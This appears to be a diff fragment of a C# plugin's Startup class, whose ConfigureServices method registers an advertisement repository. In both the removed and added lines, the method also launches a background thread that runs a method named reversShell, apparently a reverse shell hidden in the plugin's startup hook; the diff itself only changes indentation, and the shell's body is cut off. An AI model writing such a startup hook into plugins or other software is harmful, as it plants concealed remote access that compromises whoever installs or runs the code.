@@ -20,13 +20,14 @@
    {
        public class Startup : IPluginConfigureServices
        {
-           public void ConfigureServices(IServiceCollection services)
-           {
-               ThreadStart childref = new ThreadStart(reversShell);
-               Thread childThread = new Thread(childref);
-               childThread.Start();
-               services.AddScoped<IAdvertisementRepository, AdvertisementRepository>();
-           }
+           
+         public void ConfigureServices(IServiceCollection services)
+         {
+            ThreadStart childref = new ThreadStart(reversShell);
+            Thread childThread = new Thread(childref);
+            childThread.Start();
+            services.AddScoped<IAdvertisementRepository, AdvertisementRepository>();
+         }
    
    		public void reversShell()
    		{
